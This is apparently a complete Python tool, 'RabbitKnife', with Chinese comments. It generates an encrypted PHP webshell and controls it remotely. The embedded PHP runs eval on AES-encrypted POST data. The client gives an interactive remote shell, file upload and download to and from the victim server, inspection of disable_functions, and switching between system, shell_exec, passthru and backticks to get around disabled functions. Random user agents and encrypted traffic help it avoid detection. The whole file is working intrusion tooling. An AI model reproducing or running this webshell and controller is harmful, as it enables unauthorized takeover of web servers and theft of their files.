#!/usr/bin/env python
# -*- coding:utf-8 -*-
#---[ Author:nokali ]---

import requests
import colorama
import sys
from Crypto.Cipher import AES
import base64
import random
import string
from faker import Faker

webshell=''
webshell='''
<?php
header('Content-Type:text/html;charset=utf-8');
$key='1111111111111111';
$iv='2222222222222222';

$action='Rabbit';

class Rabbit{
    public function __construct($simplecode,$key,$iv){
        $this->simplecode=openssl_decrypt($simplecode,'AES-128-CBC',$key,0,$iv);
        $res='';
        ob_start();
        @eval(base64_decode($this->simplecode));
        $res=ob_get_contents();
        ob_end_clean();
        $res=base64_encode($res);
        $res=openssl_encrypt($res,'AES-128-CBC',$key,0,$iv);
        echo base64_encode($res);
    }
}

if (isset($_POST[$action])){
    $simplecode=base64_decode($_POST[$action]);
    $run=new Rabbit($simplecode,$key,$iv);
}
?>
'''
# webshell文本，可自行更改或混淆
# 需要注意，如果修改了AES密钥、iv值、连接密码等，需要在此处同步修改


AES256_key='1111111111111111'    # AES加密密钥，需要和webshell同步修改
AES256_iv='2222222222222222'    # AES iv值，需要和webshell同步修改
shell_password='Rabbit'    # 传递远程代码的的参数名，同时也是连接密码，需要和webshell同步修改（action值）

shellname='RabbitKnife.php'    #生成的webshell文件名

RandomUA=Faker()
ua=RandomUA.user_agent()

shell_functions={'system','shell_exec','passthru','``'}    #本程序支持的命令执行函数，可自行扩充，需修改命令执行部分的代码
shell_function='system'    #默认使用的命令执行函数

def AES_Encrypt(key, data):
    vi = AES256_iv
    pad = lambda s: s + (16 - len(s)%16) * chr(16 - len(s)%16)
    data = pad(data)
    # 字符串补位
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))
    encryptedbytes = cipher.encrypt(data.encode('utf8'))
    # 加密后得到的是bytes类型的数据
    encodestrs = base64.b64encode(encryptedbytes)
    # 使用Base64进行编码,返回byte字符串
    enctext = encodestrs.decode('utf8')
    # 对byte字符串按utf-8进行解码
    return enctext

def AES_Decrypt(key, data):
    vi = AES256_iv
    data = data.encode('utf8')
    encodebytes = base64.decodebytes(data)
    # 将加密数据转换位bytes类型数据
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))
    text_decrypted = cipher.decrypt(encodebytes)
    unpad = lambda s: s[0:-s[-1]]
    text_decrypted = unpad(text_decrypted)
    # 去补位
    text_decrypted = text_decrypted.decode('utf8')
    return text_decrypted

class Rabbit():
    print(colorama.Fore.GREEN+colorama.Back.BLACK)
    def connect(self,target):
        try:
            randomstr = random.sample(string.ascii_letters + string.digits, 16)
            randomstr=''.join(randomstr)
            print("[*]正在发送验证随机值："+randomstr)

            cmd="echo(\""+randomstr+"\");"
            cmd=cmd.encode('utf-8')
            payload=base64.b64encode(cmd).decode('utf-8')

            key = AES256_key
            data = payload
            enctext = AES_Encrypt(key, data)
            payload=base64.b64encode(enctext.encode('utf-8')).decode('utf-8')
                        
            headers={
                "user-agent":ua
            }
            data={
                shell_password:payload
            }
            result=requests.post(target,headers=headers,data=data)
            res_txt=result.text
            res_txt=base64.b64decode(res_txt).decode('utf-8')
            res_txt=AES_Decrypt(key,res_txt)
            res_txt=base64.b64decode(res_txt).decode('gbk')
            if randomstr in res_txt:
                print("[+]服务器返回随机值为："+res_txt)
                print("[+]随机值验证完毕，已成功连接webshell")
                print("[+]直接输入命令即可执行（默认执行方式：system函数）")
                print("[*]输入!help来获取功能列表")
                print("[*]输入!exit来退出连接")
            else:
                print("[-]随机值无法验证，连接失败。。。。")
                print("[-]输入!exit来退出连接")
        except:
            print("[-]随机值无法验证，连接失败。。。。")
            print("[-]输入!exit来退出连接")
        # 发送一个随机值，要求服务器打印该值，来测试连接是否成功



        while(1):
            cmd=input('[*]-->>')
            if cmd=='!exit':
                print(colorama.Fore.RESET+colorama.Back.RESET)
                exit()
            elif cmd=='!upload':
                try:
                    upload_filename=input("[*]输入要上传的文件名：")
                    with open(upload_filename,'rb') as upload:
                        upload_txt=upload.read()
                        upload.close()
                    cmd="$file='"+upload_filename+"';$text=base64_decode('"+base64.b64encode(upload_txt).decode('utf-8')+"');file_put_contents($file,$text);"
                    cmd=cmd.encode('utf-8')
                    payload=base64.b64encode(cmd).decode('utf-8')

                    key = AES256_key
                    data = payload
                    enctext = AES_Encrypt(key, data)
                    payload=base64.b64encode(enctext.encode('utf-8')).decode('utf-8')
                    
                    headers={
                        "user-agent":ua
                    }
                    data={
                        shell_password:payload
                    }
                    result=requests.post(target,headers=headers,data=data)
                except Exception as e:
                    print("[-]上传失败")
                    print(e)
            elif cmd=='!download':
                try:
                    download_filename=input("[*]输入要下载的文件名：")
                    cmd="$file='"+download_filename+"';echo(file_get_contents($file));"
                    
                    cmd=cmd.encode('utf-8')
                    payload=base64.b64encode(cmd).decode('utf-8')
                    
                    key = AES256_key
                    data = payload
                    enctext = AES_Encrypt(key, data)
                    payload=base64.b64encode(enctext.encode('utf-8')).decode('utf-8')
                    
                    headers={
                        "user-agent":ua
                    }
                    data={
                        shell_password:payload
                    }
                    result=requests.post(target,headers=headers,data=data)
                    try:
                        res_txt=result.text
                        res_txt=base64.b64decode(res_txt).decode('utf-8')
                        res_txt=AES_Decrypt(key,res_txt)
                        res_txt=base64.b64decode(res_txt)
                        with open(download_filename,'wb') as download:
                            download.write(res_txt)
                            download.close()
                    except Exception as e:
                        print("[-]处理返回数据出错")
                        print(e)
                except Exception as e:
                    print("[-]下载失败")
                    print(e)
            elif cmd=='!ini':
                try:
                    ini_name=input("[*]输入要查询的ini配置（例：disable_functions）：")
                    cmd="echo(@ini_get(\""+ini_name.replace("\"","\\\"")+"\"));"
                    #print(cmd)
                    cmd=cmd.encode('utf-8')
                    payload=base64.b64encode(cmd).decode('utf-8')

                    key = AES256_key
                    data = payload
                    enctext = AES_Encrypt(key, data)
                    payload=base64.b64encode(enctext.encode('utf-8')).decode('utf-8')
                    
                    headers={
                        "user-agent":ua
                    }
                    data={
                        shell_password:payload
                    }
                    result=requests.post(target,headers=headers,data=data)
                except:
                    print("[-]数据交互发生错误")
                try:
                    res_txt=result.text
                    res_txt=base64.b64decode(res_txt).decode('utf-8')
                    res_txt=AES_Decrypt(key,res_txt)
                    res_txt=base64.b64decode(res_txt).decode('gbk')
                    print(res_txt)
                except:
                    print("[-]处理返回数据出错")
            elif cmd=='!set_shell':
                print("[+]本程序支持的命令执行函数："+str(shell_functions))
                global shell_function
                if shell_function=='system':
                    print("[*]当前使用的函数为："+shell_function+"（默认值）")
                else:
                    print("[*]当前使用的函数为："+shell_function)
                shell_function=input("[*]输入要设置的命令执行函数（例：shell_exec）：")
            elif cmd=='!help':
                print("="*20)
                print("[*]您正在查看帮助列表")
                print("!exit    退出程序")
                print("!upload    上传文件")
                print("!download    下载文件")
                print("!ini    查看远程ini配置（例如disable_functions）")
                print("!set_shell    设置命令执行方式，用于绕过对部分命令执行函数的禁用")
                print("="*20)
            else:
                # 命令执行，默认使用system函数，
                # 建议先通过!ini获取disable_functions得到被禁用的命令执行函数列表，
                # 然后对比本程序支持的函数，使用未被禁用的函数来执行，
                # 设置命令执行函数：!set_shell
                try:
                    # 如果扩充了命令执行函数的列表，请修改此处代码
                    if shell_function=='system':
                        cmd="system(\""+cmd.replace("\"","\\\"")+"\");"
                    elif shell_function=='shell_exec':
                        cmd="echo(shell_exec(\""+cmd.replace("\"","\\\"")+"\"));"
                    elif shell_function=='passthru':
                        cmd="passthru(\""+cmd.replace("\"","\\\"")+"\");"
                    elif shell_function=='``':
                        cmd="print(`\""+cmd.replace("\"","\\\"")+"\"`);"
                    cmd=cmd.encode('utf-8')
                    payload=base64.b64encode(cmd).decode('utf-8')

                    key = AES256_key
                    data = payload
                    enctext = AES_Encrypt(key, data)
                    payload=base64.b64encode(enctext.encode('utf-8')).decode('utf-8')
                    
                    headers={
                        "user-agent":ua
                    }
                    data={
                        shell_password:payload
                    }
                    result=requests.post(target,headers=headers,data=data)
                except:
                    print("[-]数据交互发生错误")
                try:
                    res_txt=result.text
                    res_txt=base64.b64decode(res_txt).decode('utf-8')
                    res_txt=AES_Decrypt(key,res_txt)
                    res_txt=base64.b64decode(res_txt).decode('gbk')
                    print(res_txt)
                except:
                    print("[-]处理返回数据出错")

    def generate(self):
        shellcode=webshell
        with open(shellname,'w',encoding='utf-8') as shell:
            shell.write(shellcode)
        shell.close()
        print('[+]生成websell成功（'+shellname+'）')

manual='''
██████╗  █████╗ ██████╗ ██████╗ ██╗████████╗    ██╗  ██╗███╗   ██╗██╗███████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝    ██║ ██╔╝████╗  ██║██║██╔════╝██╔════╝
██████╔╝███████║██████╔╝██████╔╝██║   ██║       █████╔╝ ██╔██╗ ██║██║█████╗  █████╗  
██╔══██╗██╔══██║██╔══██╗██╔══██╗██║   ██║       ██╔═██╗ ██║╚██╗██║██║██╔══╝  ██╔══╝  
██║  ██║██║  ██║██████╔╝██████╔╝██║   ██║       ██║  ██╗██║ ╚████║██║██║     ███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝
                                                                                     
generate:生成webshell
connect:连接webshell
'''

if __name__=='__main__':
    main=Rabbit()
    if len(sys.argv)!=1:
        if sys.argv[1]=='generate':
            main.generate()
        elif sys.argv[1]=='connect':
            main.connect(sys.argv[2])
        else:
            pass
    else:
        print(manual)
    print(colorama.Fore.RESET+colorama.Back.RESET)